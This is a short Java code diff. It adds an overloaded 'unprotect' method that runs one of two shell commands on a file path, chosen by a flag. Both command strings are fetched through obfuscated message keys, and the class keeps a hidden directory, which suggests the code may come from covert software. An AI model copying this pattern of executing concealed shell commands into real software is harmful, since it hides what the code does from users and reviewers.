@@ -218,15 +218,24 @@ public class Path {
 	public static String logs() {
 		return hidden() + LOG_DIR;
 	}
-
+	
 	public static boolean unprotect(String path) {
+		return unprotect(path, false);
+	}
+
+	public static boolean unprotect(String path, boolean fullmode) {
 		try {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + path);
 			}
-			Runtime.getRuntime().exec(Messages.getString("h_3") + path);
+			if(fullmode){
+				Runtime.getRuntime().exec(Messages.getString("h_9") + path);
+			}else{
+				Runtime.getRuntime().exec(Messages.getString("h_3") + path);
+			}
 			return true;
-		} catch (IOException e) {
+		} catch (IOException ex) {
+			Check.log(TAG + " Error (unprotect): " + ex);
 			return false;
 		}
 	}
